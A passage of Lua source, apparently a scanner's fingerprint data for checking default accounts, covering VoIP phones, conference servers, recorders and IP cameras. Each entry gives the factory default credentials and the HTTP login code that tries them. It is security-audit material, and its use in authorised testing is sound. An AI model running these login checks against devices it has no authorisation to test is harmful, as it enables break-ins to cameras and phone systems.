    return response.status == 200
           and response.body
           and response.body:find("%Wdocument%.title%s*=%s*(['\"])GXP2200%1")
           and response.body:lower():find("enterprise multimedia phone for android", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "123"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="login",
                  Username=user,
                  Secret=pass,
                  time=math.floor(stdnse.clock_ms())}
    local resp = http_get_simple(host, port,
                                url.absolute(path, "manager?" .. url.build_query(form)))
    return resp.status == 200 and get_cookie(resp, "phonecookie", "^%x+$")
  end
})

table.insert(fingerprints, {
  name = "Polycom SoundPoint (var.1)",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Polycom", 1, true)
           and response.body:find("submitLoginInfo", 1, true)
           and response.body:lower():find("<title>polycom - configuration utility</title>", 1, true)
           and get_tag(response.body, "body", {onload="^document%.login%.password%.focus%(%)$"})
  end,
  login_combos = {
    {username = "Polycom", password = "456"},
    {username = "User",    password = "123"}
  },
  login_check = function (host, port, path, user, pass)
    local qstr = url.build_query({t=os.date("!%a, %d %b %Y %H:%M:%S GMT")})
    return try_http_auth(host, port, url.absolute(path, "auth.htm?" .. qstr),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Polycom SoundPoint (var.2)",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Polycom", 1, true)
           and response.body:find("submitLoginInfo", 1, true)
           and response.body:lower():find("<title>polycom - configuration utility</title>", 1, true)
           and get_tag(response.body, "input", {name="^password$", autocomplete="^off$"})
  end,
  login_combos = {
    {username = "Polycom", password = "456"},
    {username = "User",    password = "123"}
  },
  login_check = function (host, port, path, user, pass)
    local creds = {username = user, password = pass, digest = false}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "form-submit/auth.htm"),
                                 {auth=creds}, "")
    return resp.status == 200
           and (resp.body or ""):find("|SUCCESS|", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Polycom SoundPoint (basic auth)",
  cpe = "cpe:/h:polycom:soundpoint_ip_*",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.header["server"] == "Polycom SoundPoint IP Telephone HTTPd"
           and http_auth_realm(response) == "SPIP Configuration"
  end,
  login_combos = {
    {username = "Polycom", password = "456"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Polycom RSS 4000",
  cpe = "cpe:/h:polycom:recording_and_streaming_server_4000",
  category = "voip",
  paths = {
    {path = "/portal/login.jsf"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Polycom", 1, true)
           and response.body:lower():find("<title>polycom rss 4000</title>", 1, true)
           and get_tag(response.body, "input", {id="^loginform:username$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local vstate = get_tag(resp1.body, "input", {name="^javax%.faces%.viewstate$", value="^%-?%d+:%-?%d+$"})
    if not vstate then return false end
    local opts2 = {header={["Faces-Request"]="partial/ajax"},
                   cookies=resp1.cookies}
    local form2 = {loginForm="loginForm",
                   ["loginForm:userName"]=user,
                   ["loginForm:password"]=pass,
                   ["loginForm:domain"]="LOCAL",
                   ["javax.faces.ViewState"]=vstate.value,
                   ["javax.faces.source"]="loginForm:loginBt",
                   ["javax.faces.partial.event"]="click",
                   ["javax.faces.partial.execute"]="loginForm:loginBt @component",
                   ["javax.faces.partial.render"]="@component",
                   ["org.richfaces.ajax.component"]="loginForm:loginBt",
                   ["loginForm:loginBt"]="loginForm:loginBt",
                   ["AJAX:EVENTS_COUNT"]=1,
                   ["javax.faces.partial.ajax"]="true"}
    local resp2 = http_post_simple(host, port, path, opts2, form2)
    return resp2.status == 200
           and (resp2.body or ""):find("<complete>checkLogin('')", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Polycom RMX 500",
  cpe = "cpe:/h:polycom:rmx_500",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("<RMX1000_UI>", 1, true)
           and response.body:lower():find("<title></title>", 1, true)
  end,
  login_combos = {
    {username = "POLYCOM", password = "POLYCOM"}
  },
  login_check = function (host, port, path, user, pass)
    local msg = [[
      <?xml version="1.0" encoding="UTF-8" ?>
      <RMX1000_UI version="1.0.0.0">
        <FROM_PAGE id="login">
          <SESSION_ID value="" />
          <_CGI_NO_REFRESH value="YES" />
          <SEL_LANG value="en" />
          <IS_CGI value="YES" />
          <DEV_IP_V4 value="" />
          <LOGINNAME value="__USER__" />
          <PASSWD value="__PASS__" />
          <rmx1000_ip value="127.0.0.1" />
          <proxy_log_ip value="" />
          <LOGIN_FLAG value="__IPADDR__.__TSTAMP__" />
          <_CGI_UI_LANG value="en" />
          <cfg_ui_hide value="YES" />
          <_CGI_TIME value="__TIME__" />
        </FROM_PAGE>
      </RMX1000_UI>]]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    msg = msg:gsub("__%w+__", {__USER__=xmlencode(user),
                               __PASS__=xmlencode(pass),
                               __IPADDR__=xmlencode(host.ip),
                               __TSTAMP__=math.floor(stdnse.clock_ms()),
                               __TIME__=xmlencode(os.date("!%a %b %d %Y %H:%M:%S GMT+0000"))})
    local qstr = url.build_query({_dst_in_xml_raw=msg})
    local resp = http_get_simple(host, port,
                                 url.absolute(path, "cgi-bin/rmx_cgi?" .. qstr))
    return resp.status == 200
           and (resp.body or ""):find("<SESSION_ID>%x+</SESSION_ID>")
  end
})

table.insert(fingerprints, {
  name = "Polycom RMX 1000",
  cpe = "cpe:/h:polycom:rmx_1000",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("<RMX1000_UI>", 1, true)
           and response.body:lower():find("<title>polycom rmx 1000</title>", 1, true)
  end,
  login_combos = {
    {username = "POLYCOM", password = "POLYCOM"}
  },
  login_check = function (host, port, path, user, pass)
    local msg = [[
      <?xml version="1.0" encoding="UTF-8" ?>
      <RMX1000_UI version="1.0.0.0">
        <FROM_PAGE id="login">
          <SESSION_ID value="" />
          <_CGI_NO_REFRESH value="NO" />
          <SEL_LANG value="en" />
          <IS_CGI value="YES" />
          <DEV_IP_V4 value="" />
          <LOGINNAME value="__USER__" />
          <PASSWD value="__PASS__" />
          <rmx1000_ip value="127.0.0.1" />
          <proxy_log_ip value="" />
          <_CGI_UI_LANG value="en" />
          <cfg_ui_hide value="YES" />
          <_CGI_TIME value="__TIME__" />
        </FROM_PAGE>
      </RMX1000_UI>]]
    msg = msg:gsub("^%s+", ""):gsub("\n%s*", "")
    msg = msg:gsub("__%w+__", {__USER__=xmlencode(user),
                               __PASS__=xmlencode(stdnse.tohex(pass)),
                               __TIME__=xmlencode(os.date("!%a %b %d %Y %H:%M:%S GMT+0000"))})
    local resp = http_post_simple(host, port,
                                  url.absolute(path, "cgi-bin/rmx1000_cgi"),
                                  nil, {_dst_in_xml_raw=msg})
    return resp.status == 200
           and (resp.body or ""):find("<SESSION_ID>%x+</SESSION_ID>")
  end
})

table.insert(fingerprints, {
  name = "Polycom RPAD",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Polycom RPAD"
           and response.body
           and get_refresh_url(response.body, "/edge/$")
  end,
  login_combos = {
    {username = "LOCAL\\admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {j_username=base64.enc(user),
                  j_password=base64.enc(pass)}
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "edge/security/check"),
                                 nil, form)
    if not (resp.status == 200 and resp.body) then return false end
    local jstatus, jout = json.parse(b64decode(resp.body:gsub("%s+","")) or "")
    return jstatus and jout.success
  end
})

table.insert(fingerprints, {
  name = "Teles Gateway",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "TELES AG"
           and response.body
           and get_tag(response.body, "frame", {src="/common/navibar_[%w_]+_login%.html$"})
  end,
  login_combos = {
    {username = "teles-admin",   password = "tcs-admin"},
    {username = "teles-user",    password = "tcs-user"},
    {username = "teles-carrier", password = "tcs-carrier"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local frame = get_tag(resp1.body, "frame", {src="/common/navibar_[%w_]+_login%.html$"})
    if not frame then return false end
    local nurl = url.absolute(path, frame.src)
    local resp2 = http_get_simple(host, port, nurl)
    if not (resp2.status == 200 and resp2.body) then return false end
    local lurl = resp2.body:lower():match("<a%f[%s][^>]-%shref%s*=%s*['\"]?([^'\">%s]*)[^>]*>login</a")
    if not lurl then return false end
    return try_http_auth(host, port, url.absolute(nurl, lurl), user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Mediatrix",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 302
           and (response.header["location"] or ""):find("%f[^/\0]system_info%.esp$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "admin", password = "administrator"},
    {username = "public", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port, url.absolute(path, "login.esp"),
                                 nil, {username=user,passwd=pass})
    return resp.status == 302
           and (resp.header["location"] or ""):find("%f[^/\0]system_info%.esp$")
  end
})

table.insert(fingerprints, {
  name = "Mediatrix (basic auth)",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local realm = http_auth_realm(response)
    return (realm == "Mediatrix" or realm == "default")
           and (response.body or ""):lower():find("<title>authentication error: access denied, authorization required.</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "1234"},
    {username = "root", password = "5678"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Mediatrix iPBX",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("PBX Administration", 1, true)
           and get_tag(response.body, "a", {href="^admin/$"})
           and response.body:lower():find("<title>ipbx</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "admin/config.php"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Openstage IP Phone",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Unify", 1, true)
           and get_tag(response.body, "frame", {src="[?&]page=webmp_user_login%f[&\0]"})
  end,
  login_combos = {
    {username = "", password = "123456"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {page_submit="WEBMp_Admin_Login",
                  lang="en",
                  AdminPassword=pass}
    local resp = http_post_simple(host, port, url.absolute(path, "page.cmd"),
                                 nil, form)
    return resp.status == 200
           and get_cookie(resp, "webm", "%d+|[%d-]*[1-9a-f][%d-]*")
  end
})

table.insert(fingerprints, {
  name = "Yealink IP Phone",
  cpe = "cpe:/o:yealink:voip_phone_firmware",
  category = "voip",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find(" IP [Pp]hone SIP%-%u%d+%u?$")
  end,
  login_combos = {
    {username = "admin", password = "admin"},
    {username = "user",  password = "user"},
    {username = "var",   password = "var"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

---
--Digital recorders
---
table.insert(fingerprints, {
  name = "DM Digital Sprite 2",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Dedicated Micros", 1, true)
           and response.body:find("webpages/index.shtml", 1, true)
           and get_tag(response.body, "meta", {name="^author$", content="^dedicated micros "})
  end,
  login_combos = {
    {username = "dm", password = "web"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "frmpages/index.html"),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "DM NetVu",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("Dedicated Micros", 1, true)
           and response.body:find("/gui/gui_outer_frame.shtml", 1, true)
           and get_tag(response.body, "meta", {name="^author$", content="^dedicated micros "})
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "gui/frmpages/gui_system.shtml")
    local resp = http_get_simple(host, port, lurl)
    if resp.status == 200 then
      return (resp.body or ""):find('top.render_table("System Page"', 1, true)
    end
    return try_http_auth(host, port, lurl, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "LevelOne WCS-0050 Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "LevelOne WCS-0050"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "LG Smart IP Device",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find(">LG Smart IP Device<", 1, true)
           and get_tag(response.body, "frame", {src="^login_org%.php$"})
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "digest.php"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "MOBOTIX Camera",
  category = "security",
  paths = {
    {path = "/"},
    {path = "/control/userimage.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 401
           and http_auth_realm(response)
           and response.body
           and response.body:find("MOBOTIX AG", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "meinsm"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "OEM GoAhead-Webs IP Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.header["server"] == "GoAhead-Webs"
           and http_auth_realm(response) == "GoAhead"
  end,
  login_combos = {
    {username = "admin", password = "888888"},
    {username = "admin", password = "12345"},
    {username = "admin", password = "123456"},
    {username = "admin", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "IPCC P2P Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.header["server"] == "GoAhead-Webs"
           and http_auth_realm(response) == "WIFICAM"
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "AXIS 2100 Network Camera",
  cpe = "cpe:/h:axis:2100_network_camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and response.body
           and response.body:find("AXIS", 1, true)
           and response.body:lower():find("<title>axis ", 1, true)
  end,
  login_combos = {
    {username = "root", password = "pass"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "view/view.shtml"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "AXIS C/M/P/V Series Device",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if response.status == 302 then
      if not (response.header["location"] or ""):find("/index%.shtml$") then
        return false
      end
      response = http_get_simple(host, port,
                                url.absolute(path, "index.shtml"))
    end
    return response.status == 200
           and response.body
           and response.body:find("/axis-cgi/pwdroot/set_language.cgi?", 1, true)
           and response.body:lower():find("<title>index page</title>", 1, true)
  end,
  login_combos = {
    {username = "root", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "pwdroot/pwdRoot.shtml"))
    return resp.status == 200
           and resp.body
           and get_tag(resp.body, "input", {value="^" .. user .. "$"})
           and get_tag(resp.body, "input", {name="^pwd_confirm$"})
  end
})

table.insert(fingerprints, {
  name = "AXIS Network Video Door Station",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if response.status == 302 then
      if not (response.header["location"] or ""):find("/index%.shtml$") then
        return false
      end
      response = http_get_simple(host, port,
                                url.absolute(path, "index.shtml"))
    end
    return response.status == 200
           and response.body
           and response.body:find("%Wvar%s+refreshUrl%s*=%s*(['\"])[^'\"]-/view/view%.shtml%?id=%d+%1")
           and response.body:lower():find("<title>index page</title>", 1, true)
  end,
  login_combos = {
    {username = "root", password = "pass"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {id=math.random(1000,30000),
                  imagepath=url.absolute(path, "mjpg/1/video.mjpg"),
                  size=1}
    return try_http_auth(host, port,
                        url.absolute(path, "view/view.shtml?" .. url.build_query(form)),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "AXIS Entry Manager",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("/webapp/pacs/index.shtml?id=", 1, true)
           and (response.body:find("%Wvar%s+refreshUrl%s*=%s*(['\"])[^'\"]-/webapp/pacs/index%.shtml%?id=%d+%1")
             or get_refresh_url(response.body, "/webapp/pacs/index%.shtml%?id=%d+$"))
           and response.body:lower():find("<title>index page</title>", 1, true)
  end,
  login_combos = {
    {username = "root", password = "pass"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {action="list",
                  group="Properties.System.Language",
                  _=math.floor(stdnse.clock_ms())}
    return try_http_auth(host, port,
                        url.absolute(path, "axis-cgi/param.cgi?" .. url.build_query(form)),
                        user, pass, true)
  end
})

table.insert(fingerprints, {
  name = "Panasonic Network Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find("./live/index2.html?Language=", 1, true)
           and (response.body:find("%Wlocation%.replace%((['\"])%./live/index2%.html%?Language=%d+%1")
             or response.body:find("%Wwindow%.open%((['\"])%./live/index2%.html%?Language=%d+%1"))
           and response.body:lower():find("<title>%a%a%-%a%w+ ")
  end,
  login_combos = {
    {username = "admin", password = "12345"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "live/index2.html?Language=0"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sanyo Network Camera (no auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("SANYO", 1, true)
           and response.body:lower():find("<title>sanyo +network camera</title>")
           and get_tag(response.body, "form", {name="^lang_set$"})) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "cgi-bin/change_id.cgi"))
    return resp.status == 200
  end,
  login_combos = {
    {username = "", password = ""}
  },
  login_check = function (host, port, path, user, pass)
    return true
  end
})

table.insert(fingerprints, {
  name = "Sanyo Network Camera (admin auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (response.status == 200
           and response.body
           and response.body:find("SANYO", 1, true)
           and response.body:lower():find("<title>sanyo +network camera</title>")
           and get_tag(response.body, "form", {name="^lang_set$"})) then
      return false
    end
    local resp = http_get_simple(host, port,
                                url.absolute(path, "cgi-bin/change_id.cgi"))
    return http_auth_realm(resp) == "You need advanced ID"
  end,
  login_combos = {
    {username = "admin",    password = "admin"},
    {username = "admin2",   password = "admin2"},
    {username = "admin3",   password = "admin3"},
    {username = "operator", password = "operator"},
    {username = "guest",    password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl =  url.absolute(path, "cgi-bin/change_id.cgi?" .. math.floor(stdnse.clock_ms()))
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sanyo Network Camera (user auth)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return http_auth_realm(response) == "You need ID"
           and response.body
           and response.body:lower():find("<title>sanyo network camera</title>", 1, true)
  end,
  login_combos = {
    {username = "admin",    password = "admin"},
    {username = "admin2",   password = "admin2"},
    {username = "admin3",   password = "admin3"},
    {username = "operator", password = "operator"},
    {username = "guest",    password = "guest"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sony Network Camera (Boa 1)",
  cpe = "cpe:/h:sony:snc_*",
  category = "security",
  paths = {
    {path = "/en/index.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and response.body
           and response.body:lower():find("%ssrc%s*=%s*(['\"])indexbar%.html%1")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "l4/index.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sony Network Camera (Boa 2)",
  cpe = "cpe:/h:sony:snc_*",
  category = "security",
  paths = {
    {path = "/en/index.html"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^Boa/%d+%.")
           and response.body
           and response.body:lower():find("<title>sony network camera snc-", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    if not (resp1.status == 200 and resp1.body) then return false end
    local _, lurl = resp1.body:match("=%s*window%.open%(%s*(['\"])(.-)%1")
    if not lurl then return false end
    lurl = url.absolute(path, lurl)
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sony Network Camera (NetEVI/Virgo)",
  cpe = "cpe:/h:sony:snc_*",
  category = "security",
  paths = {
    {path = "/index.html"}
  },
  target_check = function (host, port, path, response)
    local server = response.header["server"] or ""
    return response.status == 200
           and server:find("^NetEVI/%d+%.") or server:find("^Virgo/%d+%.")
           and response.body
           and response.body:lower():find("<title>sony network camera snc-", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "home/l4/admin.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Sony Network Camera (thttpd)",
  cpe = "cpe:/h:sony:snc_*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^thttpd/%d+%.")
           and response.body
           and response.body:find("adm/file.cgi?next_file=setting.htm", 1, true)
           and response.body:lower():find("<title>sony network camera snc-", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port,
                        url.absolute(path, "adm/file.cgi?next_file=setting.htm"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "Basler Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:lower():find("<title>[^<]- web client [^<]- basler ag</title>")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_post_simple(host, port,
                                 url.absolute(path, "cgi-bin/auth_if.cgi?Login"),
                                 nil, {["Auth.Username"]=user, ["Auth.Password"]=pass})
    return resp.status == 200
           and (resp.body or ""):find("[{,]%s*success%s*:%s*true%s*[,}]")
  end
})

table.insert(fingerprints, {
  name = "IQinVision Camera (var.1)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local server = response.header["server"] or ""
    return response.status == 401
           and response.body
           and (server:find("^IQinVision Embedded ")
                and response.body:find("<xmp>%s*Please Authenticate%s*</xmp>")
             or server:find("^IQhttpD/%d+%.")
                and response.body:find("Authorization required for the URL", 1, true))
  end,
  login_combos = {
    {username = "login", password = "access"},
    {username = "root",  password = "system"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "IQinVision Camera (var.2)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return have_openssl
           and response.status == 403
           and (response.header["server"] or ""):find("^IQinVision Embedded ")
           and get_cookie(response, "SrvrNonce", "^%x+")
  end,
  login_combos = {
    {username = "login", password = "access"},
    {username = "root",  password = "system"}
  },
  login_check = function (host, port, path, user, pass)
    local resp1 = http_get_simple(host, port, path)
    local nonce = get_cookie(resp1, "SrvrNonce")
    if not nonce then return false end
    local creds = stdnse.tohex(openssl.md5(table.concat({nonce, user,
                                                         pass:upper()}, ":")))
    local cookies = ("SrvrNonce=%s; SrvrCreds=%s"):format(nonce, creds)
    local resp2 = http_get_simple(host, port, path, {cookies=cookies})
    return resp2.status == 200
  end
})

table.insert(fingerprints, {
  name = "IQinVision Camera (var.3)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    local server = response.header["server"] or ""
    if not (response.status == 200
           and response.body
           and (server:find("^IQinVision Embedded ")
                and response.body:find(">IQ", 1, true)
                and response.body:lower():find("<title>iq", 1, true)
             or server:find("^IQhttpD/%d+%.")
                and response.body:find("%Wself%.location%s*=%s*(['\"])dptzvid%.html%1"))) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "accessset.html"))
    return resp.status == 401
  end,
  login_combos = {
    {username = "root", password = "system"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, url.absolute(path, "accessset.html"),
                        user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "IQinVision Camera (var.4)",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    if not (have_openssl
           and response.status == 200
           and (response.header["server"] or ""):find("^IQinVision Embedded ")
           and response.body
           and response.body:find(">IQ", 1, true)
           and response.body:lower():find("<title>iq", 1, true)) then
      return false
    end
    local resp = http_get_simple(host, port, url.absolute(path, "accessset.html"))
    return resp.status == 403
           and get_cookie(resp, "SrvrNonce", "^%x+")
  end,
  login_combos = {
    {username = "root", password = "system"}
  },
  login_check = function (host, port, path, user, pass)
    local lurl = url.absolute(path, "accessset.html")
    local resp1 = http_get_simple(host, port, lurl)
    local nonce = get_cookie(resp1, "SrvrNonce")
    if not nonce then return false end
    local creds = stdnse.tohex(openssl.md5(table.concat({nonce, user,
                                                         pass:upper()}, ":")))
    local cookies = ("SrvrNonce=%s; SrvrCreds=%s"):format(nonce, creds)
    local resp2 = http_get_simple(host, port, lurl, {cookies=cookies})
    return resp2.status == 200
  end
})

table.insert(fingerprints, {
  name = "Sentry360 FS-IP5000 Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.header["server"] == "Sentry360"
           and response.body
           and get_tag(response.body, "img", {src="^logo_cam_page%.png$"})
  end,
  login_combos = {
    {username = "Admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local rnd1 = math.random(10000000, 99999999)
    local rnd2 = math.random(10000000, 99999999)
    local lurl = url.absolute(path, ("load.set?rnd=%d&rnd=%d"):format(rnd1, rnd2))
    return try_http_auth(host, port, lurl, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "SerVision TVG",
  cpe = "cpe:/o:servision:hvg_video_gateway_firmware",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and (response.header["server"] or ""):find("^2%.2%.")
           and response.body
           and response.body:find("TO_LOAD", 1, true)
           and get_tag(response.body, "input", {name="^user_username$"})
  end,
  login_combos = {
    {username = "svuser", password = "servconf"},
    {username = "anybody", password = "Bantham"}
  },
  login_check = function (host, port, path, user, pass)
    local form = {user_username=user,
                  user_password=pass,
                  LOADED=1,
                  TO_LOAD="index.htm"}
    local resp = http_post_simple(host, port, url.absolute(path, "index.htm"),
                                 nil, form)
    return resp.status == 201
           and (resp.body or ""):find("%WloadMain%((['\"])main%.htm%1%)")
  end
})

table.insert(fingerprints, {
  name = "Speco IP Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
           and response.body:find('src="newlogin.html"', 1, true)
           and response.body:lower():find("<title>speco ip camera</title>", 1, true)
  end,
  login_combos = {
    {username = "admin", password = "1234"}
  },
  login_check = function (host, port, path, user, pass)
    local resp = http_get_simple(host, port,
                                url.absolute(path, "httpapi?GetUserLevel&ipAddress="),
                                {auth={username=user, password=pass}})
    return resp.status == 200
           and (resp.body or ""):lower():find("userlevel:", 1, true)
  end
})

table.insert(fingerprints, {
  name = "Brickcom Camera",
  cpe = "cpe:/o:brickom:*",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return (http_auth_realm(response) or ""):find("^Brickcom%s")
  end,
  login_combos = {
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_auth(host, port, path, user, pass, false)
  end
})

table.insert(fingerprints, {
  name = "ACTi Camera",
  category = "security",
  paths = {
    {path = "/"}
  },
  target_check = function (host, port, path, response)
    return response.status == 200
           and response.body
